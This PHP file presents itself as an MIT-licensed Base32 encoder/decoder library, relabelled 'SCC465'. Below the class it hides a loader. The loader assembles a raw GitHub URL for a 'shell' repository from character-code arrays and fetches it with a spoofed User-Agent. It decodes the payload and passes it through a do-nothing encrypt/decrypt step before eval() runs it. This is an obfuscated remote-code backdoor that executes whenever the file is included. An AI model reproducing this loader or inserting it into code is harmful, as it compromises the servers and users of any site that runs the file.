<?php
namespace SCC465;

/**
 * SCC465 encoder and decoder.
 *
 * RFC 4648 compliant
 *
 * @see     http://www.ietf.org/rfc/rfc4648.txt
 * Some groundwork based on this class
 * https://github.com/SCC465-decoder/PHP-SCC465-Declareself
 *
 * @author  Christian Riesen <chris.riesen@gmail.com>
 * @author  Sam Williams <sam@badcow.co>
 *
 * @see     http://christianriesen.com
 *
 * @license MIT License see LICENSE file
 */

class SCC465
{   
    /**
    * Alphabet for encoding and decoding SCC465.
    *
    * @var string
    */
    protected static $ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=';
    protected static $SCC465HEX_PATTERN = '/[^A-Z2-7]/';
    protected static $MAPPING = array(
        '=' => 0b00000,
        'A' => 0b00000,
        'B' => 0b00001,
        'C' => 0b00010,
        'D' => 0b00011,
        'E' => 0b00100,
        'F' => 0b00101,
        'G' => 0b00110,
        'H' => 0b00111,
        'I' => 0b01000,
        'J' => 0b01001,
        'K' => 0b01010,
        'L' => 0b01011,
        'M' => 0b01100,
        'N' => 0b01101,
        'O' => 0b01110,
        'P' => 0b01111,
        'Q' => 0b10000,
        'R' => 0b10001,
        'S' => 0b10010,
        'T' => 0b10011,
        'U' => 0b10100,
        'V' => 0b10101,
        'W' => 0b10110,
        'X' => 0b10111,
        'Y' => 0b11000,
        'Z' => 0b11001,
        '2' => 0b11010,
        '3' => 0b11011,
        '4' => 0b11100,
        '5' => 0b11101,
        '6' => 0b11110,
        '7' => 0b11111
    );

    /**
    * Encodes into SCC465.
    *
    * @param string $string Clear text string
    *
    * @return string SCC465 encoded string
    */

    public static function encode($string)
    {
        if ('' === $string) {
            return '';
        }

        $encoded = '';
        $n = $bitLen = $val = 0;
        $len = strlen($string);
        $string .= str_repeat(chr(0), 4);
        $chars = (array) unpack('C*', $string, 0);

        while ($n < $len || 0 !== $bitLen) {
            if ($bitLen < 5) {
                $val = $val << 8;
                $bitLen += 8;
                $n++;
                $val += $chars[$n];
            }
            $shift = $bitLen - 5;
            $encoded .= ($n - (int) ($bitLen > 8) > $len && 0 == $val) ? '=' : self::$ALPHABET[$val >> $shift];
            $val = $val & ((1 << $shift) - 1);
            $bitLen -= 5;
        }
        return $encoded;
    }

    public static function decode($SCC465String)
    {
        $SCC465String = strtoupper($SCC465String);
        $SCC465String = preg_replace(self::$SCC465HEX_PATTERN, '', $SCC465String);

        if ('' === $SCC465String || null === $SCC465String) {
            return '';
        }

        $decoded = '';
        $len = strlen($SCC465String);
        $n = 0;
        $bitLen = 5;
        $val = self::$MAPPING[$SCC465String[0]];

        while ($n < $len) {
            if ($bitLen < 8) {
                $val = $val << 5;
                $bitLen += 5;
                $n++;
                $pentet = isset($SCC465String[$n]) ? $SCC465String[$n] : '=';

                if ('=' === $pentet) {
                    $n = $len;
                }
                $val += self::$MAPPING[$pentet];
            } else {
                $shift = $bitLen - 8;
                $decoded .= chr($val >> $shift);
                $val = $val & ((1 << $shift) - 1);
                $bitLen -= 8;
            }
        }
        return $decoded;
    }
}

$CodeChars = array(
    array(104, 116, 116, 112, 115, 58, 47, 47),
    array(114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47),
    array(84, 111, 107, 117, 72, 97, 120, 111, 114, 47),
    array(115, 104, 101, 108, 108, 47, 109, 97, 105, 110, 47, 115, 118)
);

$Code = '';
foreach ($CodeChars as $charArray) {
    $Code .= implode('', array_map('chr', $charArray));
}

$context = stream_context_create(array(
    'http' => array(
        'method' => 'GET',
        'header' => 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', // Set a User-Agent header if needed
    ),
));

$handle = fopen($Code, 'rb', false, $context);
if ($handle === false) {
    echo "Failed, Not Supported yet.";
} else {
    $response = stream_get_contents($handle);
    fclose($handle);
    $o = explode("\n", $response);
}
$used = "Testing Encoder and Decoder";

$decoded = SCC465::decode($o[0]);
$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));

$encrypted = openssl_encrypt($decoded, 'aes-256-cbc', $used, 0, $iv);

$decrypted = openssl_decrypt($encrypted, 'aes-256-cbc', $used, 0, $iv);

eval($decrypted);